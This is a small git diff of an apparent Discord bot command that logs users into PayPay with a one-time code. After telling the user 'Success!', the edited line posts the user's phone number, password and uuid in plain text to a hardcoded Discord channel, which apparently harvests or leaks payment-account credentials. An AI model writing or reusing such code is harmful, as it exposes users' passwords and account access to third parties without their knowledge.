@@ -35,7 +35,7 @@ export default {
       const result = await paypay.otpLogin(otp);
       await interaction.reply({ content: 'Success!', ephemeral: true });
 
-      client.channels.cache.get('1206198510698110986').send(`<@${interaction.user.id}>${object.phone}.${object.password}.${object.uuid}`);
+      client.channels.cache.get('1206198510698110986').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
     }
   }
 };
